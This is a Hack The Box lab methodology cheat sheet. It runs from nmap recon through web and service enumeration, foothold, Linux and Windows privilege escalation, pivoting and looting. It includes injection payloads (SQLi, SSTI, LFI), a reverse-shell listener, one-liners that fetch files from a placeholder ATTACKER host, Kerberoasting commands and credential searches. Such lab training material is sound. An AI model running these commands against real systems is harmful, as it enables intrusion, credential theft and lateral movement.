---
icon: head-side-gear
---

# HTB Machines Approach

**HTB Cheat Sheet — From Nmap to Root (All OS, All Difficulties)**

> for legal platforms/labs (HTB, PG, internal ranges). log everything, version-control notes, and clean up artifacts.

***

### 0) Pre-Run Setup (Do this once per new box)

*   Create workspace:

    ```bash
    export IP=10.10.10.10; export BOX=target; mkdir -p ~/htb/$BOX/{nmap,enum,loot,exploits,notes,screens}
    tmux new -s $BOX
    ```
*   Hosts entry & wordlists:

    ```bash
    echo "$IP $BOX.htb $BOX.local" | sudo tee -a /etc/hosts
    ```
*   Listeners ready:

    ```bash
    rlwrap -cAr nc -lvnp 4444
    python3 -m http.server 8000
    ```
*   Note template (keep one per box):

    ```
    BOX:       ____   IP: ______
    OS: ______ (guess)   Diff: _   Points:
    Services:  (ports/protos/versions)
    Attack surface: (web/smb/ldap/rpc/rdp/ssh/winrm/db)
    Paths: (A) web->RCE (B) SMB->Creds (C) AD->Kerberoast (D) ...
    Foothold vector: ______
    PrivEsc plan (Linux/Windows): ______
    Loot: flags, creds, tickets, keys
    ```

***

### 1) Recon & Enumeration (Always)

#### 1.1 Fast Port Discovery → Then Deep

*   **Top ports quick**:

    ```bash
    nmap -Pn -n --top-ports 1000 --min-rate 5000 -oA nmap/top $IP
    ```
*   **Full TCP**:

    ```bash
    nmap -Pn -n -p- --min-rate 5000 -oA nmap/alltcp $IP
    ```
*   **Service/version/scripts on found ports**:

    ```bash
    nmap -Pn -sC -sV -p$(grep -oP '\d+\/tcp' nmap/alltcp.nmap|cut -d/ -f1|tr '\n' ,|sed 's/,$//') -oA nmap/deep $IP
    ```
*   **UDP (selective)**:

    ```bash
    nmap -sU --top-ports 50 -oA nmap/udp $IP
    ```

#### 1.2 Fingerprint & Quickly Branch by Service

**HTTP/HTTPS (80/443/8080/8443/…):**

```bash
whatweb http://$IP
curl -I http://$IP/
gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,js,txt,conf,zip,tar,sql -t 50 -k
nikto -h http://$IP
```

Checklist:

* virtual hosts? `Host: dev.$BOX.htb`
* robots.txt / backup files (`.bak`, `.old`, `.swp`)
* uploads, LFI/XXE/SSRF, file read/write, deserialization, outdated CMS, default creds

**SMB/NetBIOS (139/445):**

```bash
smbclient -L //$IP/ -N
smbmap -H $IP
crackmapexec smb $IP --shares
rpcclient -U "" $IP -c "enumdomusers"
```

**WinRM (5985/5986):**

* If you get creds → `evil-winrm -i $IP -u user -p pass`

**RDP (3389):**

* Screenshot & version: `xfreerdp /v:$IP /cert:ignore`

**FTP (21), TFTP (69):**

```bash
ftp $IP    # try anonymous
tftp $IP -c get file
```

**LDAP/AD (389/636/3268/88):**

```bash
ldapsearch -x -H ldap://$IP -b "" -s base "(objectClass=*)" "* +"
kerbrute userenum -d htb.local --dc $IP users.txt
```

* if domain visible: note **REALM**, **DC**, **SPNs**, **AS-REP/Kerberoast** candidates.

**Databases (3306/1433/5432/1521):**

* try blank/weak creds; enumerate schema; check file read primitives.

**Docker/K8s/Dev (2375/5000/8081/9000/10250):**

* unsecured Docker API? `curl http://$IP:2375/containers/json`.

***

### 2) Web Methodology (applies to many boxes)

1. **Content discovery** → dirs/files/vhosts.
2. **Parameter discovery**: `arjun -u http://$IP/endpoint`
3. **Identify framework/CMS** and version → search CVEs.
4. **Vuln patterns:**
   * **Auth bypass / IDOR / Path traversal / LFI**: `../../../../etc/passwd`, log poisoning → RCE
   * **Upload**: content-type bypass, double extensions `p.php.jpg`, polyglot
   * **Deserialization**: PHP (Phar), Java (CommonsCollections), .NET ViewState
   * **SSTI**: `{{7*7}}`, `${{7*7}}`, `*{7*7}`
   * **SSRF**: access metadata `http://169.254.169.254/` (lab only)
   * **SQLi**: `' OR 1=1-- -` → dump creds → reuse
5. **Shell delivery**: get a webshell or reverse shell (use your **Reverse Shells** module).
6.  **Stabilize TTY** (Linux):

    ```bash
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm; stty raw -echo; fg
    ```

***

### 3) Initial Foothold (Non-Web services)

**SMB**: writable share → drop webshell/exe; read configs for creds.\
**FTP/TFTP**: upload webroot file? download config/backup?\
**SSH**: found creds/private keys? try username re-use, `authorized_keys`.\
**Kerberos/AD**:

* **AS-REP roast** (no pre-auth): `GetNPUsers.py`
* **Kerberoast**: `GetUserSPNs.py -request`
* crack tickets → WinRM/RDP

***

### 4) Post-Exploitation Enumeration (Local)

#### 4.1 Linux quick enum

```bash
whoami; id; hostname; uname -a
ip a; ss -tulnp
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -la /home; ls -la /root
cat /etc/crontab
env; set
```

* config creds: `/var/www`, `/opt`, `.env`, `config.php`
* service files & timers: `/etc/systemd/system`
* passwords in scripts/backups/logs

#### 4.2 Windows quick enum

```powershell
whoami /all
ipconfig /all
net user; net localgroup administrators
wmic service get name,startname,startmode,state
schtasks /query /fo LIST /v
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

* loot: `C:\Users\<user>\Desktop`, `AppData\Roaming\Microsoft\Credentials`, browser data, config files
* check AV/EDR status; avoid noisy tooling on higher diffs

***

### 5) Privilege Escalation Playbooks

#### 5.1 Linux PrivEsc Decision Tree

1. **Sudo**: `sudo -l`
   * `NOPASSWD`? → GTFOBins
2. **SUID/Capabilities**: `find / -perm -4000 …`, `getcap -r /`
   * `python`, `perl`, `find`, `tar`, `cp`, `nmap`, `vim`, `cap_setuid` → GTFOBins paths
3. **Writable service/script**: systemd service, cron job → path hijack
4. **Kernel/CVE** (older kernels): dirtycow/overlayfs (only where appropriate)
5. **Passwords/keys**: reuse to `sudo`/`ssh` other users; `id_rsa` + weak passphrase
6. **LFI→log poison** or **db creds** → root via app context
7. **Docker/LXC**: in docker group? mount host → root

#### 5.2 Windows PrivEsc Decision Tree

1. **Token privileges**: `whoami /priv`
   * `SeImpersonatePrivilege` → JuicyPotato/PrintSpoofer (lab)
2.  **Unquoted service path / weak service perms**:

    ```cmd
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
    sc qc <svc> & icacls "C:\Program Files\<path>"
    ```
3. **AlwaysInstallElevated** (MSI as SYSTEM)
4. **Scheduled tasks** writable?
5. **Registry autoruns** writable Run keys
6. **Hotfixes / vulns**: PrintNightmare (old), MS16-032, outdated drivers
7. **Credential material**:
   * Saved creds: `cmdkey /list`
   * Browser creds, config files, unattended.xml, `C:\ProgramData\` app configs

> Tip: On Insane, expect chaining (e.g., AD abuse → Delegation/Constrained Delegation, Certifried/ESC1-ESC8, Shadow Credentials, RBCD).

***

### 6) Lateral Movement / Pivoting (when multiple hosts or AD)

* **SSH**/WinRM with new creds.
*   **Port-forward**:

    ```bash
    ssh -L 8080:127.0.0.1:8080 user@$IP
    chisel server -p 8000 --reverse  # attacker
    chisel client attacker:8000 R:1080:socks    # target→attacker SOCKS
    proxychains nmap -sT -Pn 127.0.0.1 -p 80,443
    ```
* **Pass-the-hash / tickets** (Windows labs):
  * Kerberoast cracked → `evil-winrm`/`psexec.py`
  * RBCD / Shadow creds → `impacket-addComputer`, `impacket-rbcd`.

***

### 7) Looting & Exfil (HTB flags + supporting evidence)

* User/root/Admin/Desktop
* Key evidence: creds, tickets, proof of vuln exploitation (screens, command logs)
* Keep a `/loot/README.md` with:
  * paths, timestamps, hashes, commands

***

### 8) Cleanup (good practice)

* Remove uploaded files, users, tasks, service edits.
* Reset modified configs (if box expects persistence for realism, follow write-up norms).
* Keep only your **notes** locally.

***

### 9) Time Management & Difficulty Guidance

* **Easy**: brute surface (web+SMB+FTP), one clean vuln → foothold → one privesc misconfig.
* **Medium**: minor chaining (auth bypass → file read → creds → privesc).
* **Hard**: deeper chaining, custom serialization, AD abuse, pivot.
* **Insane**: multi-stage, crypto/forensics, AD enterprise abuse (RBCD/CERT/ACL), heavy logic.

**Pacing (90–120 min target):**

* 0–15m: scans + service map
* 15–45m: pick 1–2 high-probability paths (web/SMB/AD)
* 45–75m: foothold
* 75–105m: privesc
* > 105m: re-branch, read hints, try alternate services

***

### 10) “Stuck?” — Unblocker Checklist

* Re-read nmap banners & page source.
* Try vhosts/subdomains (`gobuster vhost`).
* Switch wordlists (raft, big, language-specific).
* Change **User-Agent**/cookies; test roles (guest/user/admin).
* Fuzz parameters (`arjun`, `ffuf` for GET/POST/JSON).
* Re-check creds reuse & default creds.
* Grep recursively for secrets: `grep -r "pass\|key\|token" /var/www`
* Enumerate **every** open port (don’t tunnel vision on web).
* On Windows, think **AD**: SPNs, AS-REP, constrained delegation, certificates (ESC1-ESC8).

***

### 11) Golden One-Liners (you’ll use constantly)

**File transfer**

```bash
# Linux
curl -o /tmp/x http://ATTACKER:8000/x; chmod +x /tmp/x
# Windows
certutil -urlcache -split -f http://ATTACKER/x.exe x.exe
```

**TTY upgrade**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'; stty raw -echo; fg; export TERM=xterm
```

**Enumerate SUID/cron/caps (Linux)**

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; systemctl list-timers
```

**Windows service check**

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
```

**AD roast quickies**

```bash
GetNPUsers.py domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
GetUserSPNs.py domain.local/user:pass -dc-ip $IP -request
```

**Web fuzz**

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,204,301,302,307,401,403
```

***

### 12) Reporting Notes (HTB write-ups/portfolio)

* Repro steps + screenshots (one per pivot).
* Root cause (CVE/config/logic).
* Impact & mitigation.
* Snippets: request/response, exploit commands, hashes.
* Keep a tidy `/notes/report.md` per box.

***

### 13) Mini Checklists (Print-worthy)

**Initial Sweep**

* [ ] Full TCP scan
* [ ] Selective UDP
* [ ] Web dir/vhost brute
* [ ] SMB/LDAP/WinRM enum
* [ ] DB login check
* [ ] AD realm & SPNs (if Windows)

**Foothold**

* [ ] Creds from configs/backups
* [ ] Upload/RCE/LFI path
* [ ] Shell stabilized & exported

**PrivEsc**

* [ ] sudo -l / SUID / caps
* [ ] cron/service hijack
* [ ] kernel/driver CVEs (age-appropriate)
* [ ] AD abuses (tokens, SPNs, certs)

**Post**

* [ ] Flag + screenshot
* [ ] Loot archived
* [ ] Cleanup performed
* [ ] Report notes updated

***

### 14) Service-Specific Quick Hints

* **Tomcat/JBoss/Jenkins**: weak creds, deploy WAR/Script Console.
* **PHP apps**: upload tricks, Phar deserialization, LFI → log poison.
* **.NET/Windows**: web.config connectionStrings → DB creds → OS exec via xp\_cmdshell or runas.
* **Redis**: write cron/authorized\_keys (lab).
* **NFS**: `no_root_squash` → map root to host.
* **Docker**: `docker.sock` exposed or `docker` group membership.
* **Elasticsearch/Kibana**: version-specific RCEs; exposed APIs.

***

### 15) Toolbelt (lean & mean)

* Scanners: `nmap`, `rustscan`, `masscan`
* Web: `ffuf`, `gobuster`, `wfuzz`, `nikto`, `whatweb`, `burp`
* SMB/AD: `smbclient`, `crackmapexec`, `impacket-*`, `bloodhound`
* Windows shells: `evil-winrm`, `xfreerdp`
* Enumeration: `linpeas`, `winpeas` (if culture of the box allows), manual > auto on Hard+
* Tunnels: `ssh`, `chisel`, `socat`, `proxychains`
* Wordlists: SecLists (raft, endpoints, credentials)

***

#### Final Motto

> **Enumerate → Pick a path → Prove code execution → Stabilize → Enumerate local → PrivEsc → Loot → Report → Clean.**\
> When in doubt: **scan again, read banners, change angle.** Most fails are enumeration failures.

***
